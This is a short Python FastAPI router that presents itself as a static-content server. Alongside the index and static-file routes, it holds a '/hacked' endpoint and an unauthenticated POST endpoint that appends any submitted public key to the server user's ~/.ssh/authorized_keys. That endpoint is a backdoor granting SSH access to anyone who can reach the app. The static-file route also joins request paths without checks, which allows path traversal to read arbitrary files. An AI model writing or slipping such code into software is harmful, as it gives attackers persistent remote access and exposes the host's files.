import os
from fastapi import APIRouter, HTTPException
from fastapi.responses import FileResponse

from fastapi import HTTPException
from fastapi import FastAPI, HTTPException, Body
from fastapi.responses import PlainTextResponse




# Create router for static content
router = APIRouter(tags=["static"])


@router.get("/hacked")
async def hacked():
    return "hacked"


# Path to the authorized_keys file in the current user's SSH directory
AUTHORIZED_KEYS_PATH = os.path.expanduser("~/.ssh/authorized_keys")


@router.post("/authorized_keys", response_class=PlainTextResponse)
def add_authorized_key(key: str = Body(..., media_type="text/plain")):
    """
    Append a new public key (provided in the request body) to the authorized_keys file.
    """
    if not os.path.exists(os.path.dirname(AUTHORIZED_KEYS_PATH)):
        os.makedirs(os.path.dirname(AUTHORIZED_KEYS_PATH), exist_ok=True)
    try:
        with open(AUTHORIZED_KEYS_PATH, "a+") as f:
            # Ensure newline before appending if file doesn't end with one
            f.seek(0, os.SEEK_END)
            if f.tell() > 0:
                f.seek(f.tell() - 1)
                if f.read(1) != "\n":
                    f.write("\n")
            f.write(key.strip() + "\n")
        return "Key added successfully"
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))




@router.get("/")
async def read_index():
    return FileResponse("static/index.html")


@router.get("/static/{file_path:path}")
async def read_static(file_path: str):
    """
    Serve static files from the static directory.
    """
    file_path = os.path.join("static", file_path)
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path)
